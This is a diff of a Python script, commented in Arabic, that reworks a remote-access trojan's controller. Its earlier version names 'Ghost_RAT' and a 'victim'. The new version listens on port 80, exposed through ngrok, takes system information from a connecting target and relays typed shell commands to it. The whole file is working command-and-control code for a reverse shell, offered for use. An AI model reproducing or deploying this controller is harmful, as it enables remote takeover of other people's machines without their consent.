@@ -1,34 +1,34 @@
 import socket
 
-# بما إن التجربة على نفس الجهاز، هنستخدم الـ Localhost
-TARGET_IP = "127.0.0.1"
-PORT = 4444
+# البورت اللي إنت فاتحه في ngrok
+PORT = 80
 
 
-def start_controller():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def listener():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", PORT))
+    s.listen(5)
+    print(f"[*] Waiting for connection on port {PORT}...")
 
-    # هنا الكنترولر هو اللي "بيسمع" (Listen)
-    server.bind(("0.0.0.0", PORT))
-    server.listen(1)
-    print(f"[*] Waiting for victim to connect on port {PORT}...")
+    conn, addr = s.accept()
+    print(f"[+] Connected by {addr}")
 
-    conn, addr = server.accept()
-    print(f"[+] Victim Connected from: {addr[0]}")
+    # استقبال معلومات النظام أول ما يتصل
+    sys_info = conn.recv(4096).decode()
+    print(f"[!] Target Info: {sys_info}")
 
     while True:
-        command = input("Ghost_RAT@Target:~$ ")
-        if not command.strip():
-            continue
+        command = input("Shell> ")
         if command.lower() == "exit":
+            conn.send(b"exit")
+            conn.close()
             break
 
-        conn.send(command.encode())
-        # استقبال النتيجة
-        response = conn.recv(1024 * 50).decode(errors="ignore")
-        print(response)
+        if command.strip():
+            conn.send(command.encode())
+            result = conn.recv(16384).decode()  # استلام نتيجة الأمر
+            print(result)
 
 
 if __name__ == "__main__":
-    start_controller()
+    listener()
